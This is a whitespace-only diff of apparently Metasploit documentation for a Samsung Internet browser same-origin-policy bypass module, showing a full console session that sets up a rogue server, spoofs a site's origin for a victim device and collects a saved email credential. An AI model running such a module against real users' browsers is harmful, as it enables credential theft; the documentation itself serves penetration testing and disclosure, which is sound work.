@@ -15,8 +15,8 @@ This Module was tested on Samsung Internet Browser 5.4.02.3 during development.
 
 ## Scenarios
 ```
-$ sudo msfconsole -q 
-msf > use auxiliary/gather/samsung_browser_sop_bypass 
+$ sudo msfconsole -q
+msf > use auxiliary/gather/samsung_browser_sop_bypass
 msf auxiliary(samsung_browser_sop_bypass) > set SRVHOST 192.168.1.104
 SRVHOST => 192.168.1.104
 msf auxiliary(samsung_browser_sop_bypass) > set SRVPORT 9090
@@ -27,7 +27,7 @@ msf auxiliary(samsung_browser_sop_bypass) > set TARGET_URL https://www.google.co
 TARGET_URL => https://www.google.com/csi
 msf auxiliary(samsung_browser_sop_bypass) > run
 [*] Auxiliary module execution completed
-msf auxiliary(samsung_browser_sop_bypass) > 
+msf auxiliary(samsung_browser_sop_bypass) >
 [*] Using URL: http://192.168.1.104:9090/
 [*] Server started.
 [*] 192.168.1.101: Request 'GET /'
@@ -38,7 +38,7 @@ msf auxiliary(samsung_browser_sop_bypass) >
 [*] 192.168.1.101: Attempting to spoof origin for https://www.google.com/csi
 [+] 192.168.1.101: Collected credential for 'https://www.google.com/csi' emailID:MyStrongPassword
 
-msf auxiliary(samsung_browser_sop_bypass) > creds 
+msf auxiliary(samsung_browser_sop_bypass) > creds
 Credentials
 ===========
 
@@ -46,11 +46,11 @@ host            origin          service          public          private        
 ----            ------          -------          ------          -------                                                            -----                       ------------
                                                  emailID         MyStrongPassword                                                   https://www.google.com/csi  Password
 
-msf auxiliary(samsung_browser_sop_bypass) > 
+msf auxiliary(samsung_browser_sop_bypass) >
 ```
 
 ## Demos
 
-Working of MSF Module: `https://youtu.be/ulU98cWVhoI` 
+Working of MSF Module: `https://youtu.be/ulU98cWVhoI`
 
 Vulnerable Browser: `https://youtu.be/lpkbogxJXnw`
